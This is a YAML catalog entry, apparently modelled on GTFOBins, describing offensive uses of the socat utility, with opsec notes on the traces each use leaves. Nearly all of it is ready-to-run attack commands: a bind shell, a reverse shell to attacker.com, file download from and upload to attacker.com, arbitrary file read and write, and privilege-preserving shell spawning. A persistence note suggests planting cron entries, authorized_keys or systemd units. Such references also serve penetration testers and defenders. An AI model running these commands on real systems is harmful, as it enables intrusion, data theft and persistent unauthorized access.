---
name: socat
capabilities:
- exec
- spawn
- read
- write
- upload
- download
- bind
- reverse-shell
required_permissions:
  level: user
difficulty: low
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: bind-shell
  description: Open a bind shell on a listening port.
  capabilities:
  - bind
  - exec
  command: socat tcp-listen:12345,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: socat -u file:/path/to/input-file -
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: socat -u 'exec:echo DATA' open:/path/to/output-file,creat
  notes: The `echo` command is actually used.
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: socat tcp-connect:attacker.com:12345 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: socat -u file:/path/to/input-file tcp-connect:attacker.com:12345
references:
- https://gtfobins.github.io/gtfobins/socat/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
